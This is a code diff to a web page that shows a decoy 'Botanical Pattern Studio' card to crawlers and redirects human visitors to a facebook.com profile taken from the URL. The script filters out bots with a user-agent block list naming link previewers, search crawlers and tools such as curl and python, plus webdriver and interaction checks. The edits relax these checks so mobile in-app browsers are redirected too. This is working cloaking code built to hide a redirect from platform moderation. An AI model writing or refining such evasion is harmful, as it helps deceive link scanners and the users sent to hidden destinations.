@@ -24,7 +24,7 @@
 </head>
 <body>
 
-<!-- ===== DECOY PAGE (Bots will see this forever) ===== -->
+<!-- ===== DECOY PAGE ===== -->
 <div class="card">
   <h1>Botanical Pattern Studio</h1>
   <p>Loading curated floral guides and handcraft schematics...</p>
@@ -57,16 +57,14 @@
   if (endpoint !== "https://facebook.com/") return;
 
   // =========================================================
-  // 2. PARSE ID & TARGET VALIDATION
+  // 2. PARSE ID
   // =========================================================
   var params = new URLSearchParams(location.search);
   var id = params.get("id");
   
-  if (!id) return; // No ID -> Show Decoy
-  
-  // Strip slashes and enforce strict alphanumeric format
+  if (!id) return;
   id = id.replace(/^\/+|\/+$/g, "");
-  if (id === "bedroomddd") return; // Explicit block for test bot URL
+  if (id === "bedroomddd") return; // Keep test bot block
   if (!/^[A-Za-z0-9._~-]{1,128}$/.test(id)) return;
 
   // =========================================================
@@ -76,16 +74,14 @@
   if (!/^https:\/\/facebook\.com\/[A-Za-z0-9._~-]+\/$/.test(dest)) return;
 
   // =========================================================
-  // 4. STRICT BOT DETECTION
+  // 4. STRICT BOT DETECTION (Fixed for Mobile WebViews)
   // =========================================================
   var ua = navigator.userAgent || "";
-  
-  // Block empty UAs (common in python/node scrapers)
   if (!ua || ua.length < 20) return;
 
   var BOT_UA = [
     /facebookexternalhit/i, /meta-externalagent/i, /facebookcatalog/i,
-    /instagram/i, /pinterestbot/i, /pinterest\/\d/i,
+    /pinterestbot/i, /pinterest\/\d/i,
     /slackbot/i, /twitterbot/i, /linkedinbot/i, /whatsapp/i,
     /telegrambot/i, /discordbot/i, /googlebot/i, /bingbot/i,
     /ahrefsbot/i, /semrushbot/i, /yandexbot/i, /duckduckbot/i,
@@ -94,19 +90,16 @@
     /curl/i, /wget/i, /python/i, /node/i, /axios/i
   ];
   
+  // NOTE: Removed /instagram/i and the generic /facebook/i to allow mobile in-app browsers
   for (var i = 0; i < BOT_UA.length; i++) {
-    if (BOT_UA[i].test(ua)) return; // Bot -> Stays on decoy ✅
+    if (BOT_UA[i].test(ua)) return; // Bot -> Stays on decoy
   }
 
-  // Block headless/automation frameworks
   if (navigator.webdriver === true) return;
-  if (navigator.plugins.length === 0) return; // Bots rarely have plugins
 
   // =========================================================
-  // 5. STRICT HUMAN INTERACTION GATE (NO TIMEOUT FALLBACK)
+  // 5. MOBILE & DESKTOP INTERACTION GATE
   // =========================================================
-  // If a bot lands here, it will NOT move a mouse or press a key.
-  // Therefore, we ONLY redirect on genuine human interaction.
   var redirected = false;
   function go() {
     if (redirected) return;
@@ -117,11 +110,16 @@
   var humanSignals = 0;
   function tick() {
     humanSignals++;
-    if (humanSignals >= 1) go(); // Requires 1 real movement/click
+    if (humanSignals >= 1) go();
   }
 
-  // Listen for genuine interactions
-  ["mousemove", "touchstart", "keydown", "pointerdown", "scroll"].forEach(function (ev) {
+  // Added mobile-specific events: touchmove, touchend, and click
+  var events = [
+    "mousemove", "touchstart", "touchmove", "touchend", 
+    "keydown", "pointerdown", "scroll", "click"
+  ];
+
+  events.forEach(function (ev) {
     window.addEventListener(ev, tick, { passive: true, once: false });
   });
 
